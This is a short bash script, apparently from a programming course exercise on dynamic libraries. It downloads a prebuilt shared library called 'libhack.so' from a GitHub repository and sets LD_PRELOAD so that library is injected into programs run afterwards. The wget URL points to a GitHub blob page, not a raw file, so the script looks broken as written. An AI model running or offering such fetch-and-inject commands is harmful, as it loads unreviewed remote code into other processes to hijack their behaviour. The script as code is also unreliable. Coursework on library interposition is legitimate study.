#!/bin/bash
wget -P .. https://github.com/parksomin72/alx-low_level_programming/blob/12404600cc7d1524ec100ac2c0204be4c49cf3dd/0x18-dynamic_libraries/libhack.so
export LD_PRELOAD="$PWD/../libhack.so"
